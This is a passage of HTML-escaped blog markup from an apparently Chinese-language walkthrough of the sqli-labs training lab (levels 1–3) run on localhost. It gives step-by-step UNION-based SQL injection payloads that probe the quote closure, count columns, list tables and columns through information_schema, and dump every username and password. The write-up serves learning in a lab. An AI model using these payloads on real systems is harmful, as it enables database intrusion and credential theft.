&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161256.png" alt="Pasted image 20250313161256">&lt;br>
7.构造&lt;code>?id=-1' union select 1,2,database() --+&lt;/code>知道了&lt;strong>数据库名为security&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">database&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161350.png" alt="Pasted image 20250313161350">&lt;br>
8.构造&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;&lt;/span>&lt;span class="nx">security&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161444.png" alt="Pasted image 20250313161444">&lt;br>
9.构造&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;&lt;/span>&lt;span class="nx">users&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>在数据库information_schema中的columns里查找出数据库security中的users表的全部字段&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161527.png" alt="Pasted image 20250313161527">&lt;br>
10.构造&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">username&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">password&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">users&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>爆出所有的用户名和密码&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161635.png" alt="Pasted image 20250313161635">&lt;/p>
&lt;h1 id="less-2">Less-2&lt;/h1>
&lt;p>&lt;strong>验证注入点：单引号报错，不用闭合可执行 SQL语句利用闭合方式：&lt;code>&amp;lt;payload&amp;gt;&lt;/code>&lt;/strong>&lt;br>
与第一关基本一样，就 &lt;code>id&lt;/code> 不用闭合&lt;br>
1.进入第二题，显示&lt;code>Please input the ID as parameter with numeric value&lt;/code>，告诉了我们参数为&lt;strong>id&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161818.png" alt="Pasted image 20250313161818">&lt;br>
2.构造&lt;code>?id=1&lt;/code>,页面显示正常&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161840.png" alt="Pasted image 20250313161840">&lt;br>
3.接下来加个单引号，显示语句出错，根据报错信息可以得知是&lt;code>单引号&lt;/code>影响了SQL语句的闭合，由此判断出这题是&lt;strong>数字型注入&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161910.png" alt="Pasted image 20250313161910">&lt;br>
4.构造&lt;code>?id=1 order by 3 --+&lt;/code>通过order by子句来判断该数据表的字段数&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-2/?id=1 order by 3 --+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>![[Pasted image 20250313162025.png]]&lt;br>
构造&lt;code>?id=1 order by 4 --+&lt;/code>页面报错，由此可知该表&lt;strong>字段数为3&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-2/?id=1 order by 4 --+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>![[Pasted image 20250313162128.png]]&lt;br>
5.构造&lt;code>?id=-1 union select 1,2,3 --+&lt;/code>判断出&lt;strong>回显点为该表的第二、三字段&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-2/?id=1 union select 1,2,3 --+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162206.png" alt="Pasted image 20250313162206">&lt;br>
6.构造&lt;code>?id=-1 union select 1,2,database() --+&lt;/code>知道了数据库名为security&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">database&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162325.png" alt="Pasted image 20250313162325">&lt;br>
7.构造&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">table_name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">information_schema&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">tables&lt;/span> &lt;span class="nx">where&lt;/span> &lt;span class="nx">table_schema&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;security&amp;#39;&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在数据库information_schema中的tables表里查询出security数据库的表有：&lt;strong>emails,referers,uagents,users&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162432.png" alt="Pasted image 20250313162432">&lt;br>
8.构造&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">column_name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">information_schema&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">columns&lt;/span> &lt;span class="nx">where&lt;/span> &lt;span class="nx">table_name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;users&amp;#39;&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在数据库information_schema中的columns里查找出数据库&lt;strong>security中的users表的全部字段&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162527.png" alt="Pasted image 20250313162527">&lt;br>
9.构造&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">username&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">password&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">users&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>爆出所有的用户名和密码&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162629.png" alt="Pasted image 20250313162629">&lt;/p>
&lt;h1 id="less-3">Less-3&lt;/h1>
&lt;p>&lt;strong>验证注入点：单引号报错，两个单引号闭合利用闭合方式：&lt;code>') &amp;lt;payload&amp;gt; --+&lt;/code>&lt;/strong>&lt;br>
也是闭合符号不一样&lt;br>
1.进入第三题，显示&lt;code>Please input the ID as parameter with numeric value&lt;/code>，告诉了我们参数为&lt;strong>id&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162714.png" alt="Pasted image 20250313162714">&lt;br>
2.构造&lt;code>?id=1&lt;/code>,页面显示正常。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>![[Pasted image 20250313163018.png]]&lt;br>
3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数&lt;code>id&lt;/code>的值被&lt;strong>单引号和括号&lt;/strong>包裹&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-3/?id=1&amp;#39;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163104.png" alt="Pasted image 20250313163104">&lt;br>
4.构造&lt;code>?id=1') order by 3 --+&lt;/code>通过order by子句来判断该数据表的字段数&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-3/?id=1&amp;#39;) order by 3 --+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>![[Pasted image 20250313163156.png]]&lt;br>
构造&lt;code>?id=1') order by 4 --+&lt;/code>页面报错，由此可知该表&lt;strong>字段数为3&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163217.png" alt="Pasted image 20250313163217">&lt;br>
5.构造&lt;code>?id=-1') union select 1,2,3 --+&lt;/code>判断出回显点为该&lt;strong>表的第二、三字段&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>![[Pasted image 20250313163335.png]]&lt;br>
6.构造&lt;code>?id=-1') union select 1,2,database() --+&lt;/code>知道了&lt;strong>数据库名为security&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">database&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163513.png" alt="Pasted image 20250313163513">&lt;br>
7.构造&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;&lt;/span>&lt;span class="nx">security&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在数据库information_schema中的tables表里查询出security数据库的表有：&lt;strong>emails,referers,uagents,users&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163605.png" alt="Pasted image 20250313163605">&lt;br>
8.构造&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;&lt;/span>&lt;span class="nx">users&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在数据库information_schema中的columns里查找出&lt;strong>数据库security中的users表的全部字段&lt;/strong>&lt;br>
![[Pasted image 20250313165309.png]]&lt;br>
9.构造&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
